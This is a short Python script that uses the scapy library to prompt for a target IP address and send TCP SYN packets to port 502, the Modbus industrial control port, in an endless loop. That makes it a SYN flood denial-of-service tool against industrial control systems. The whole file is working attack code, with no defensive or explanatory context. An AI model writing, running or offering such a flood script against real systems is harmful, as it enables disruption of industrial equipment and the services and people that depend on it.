#!/usr/bin/python
from scapy.all import *

try:
    target = raw_input("Choose your target :")
    trame=IP(dst=target)/TCP(flags='S', dport=502)
    send(trame, loop=1)

except:
    print("choose IP plz...")
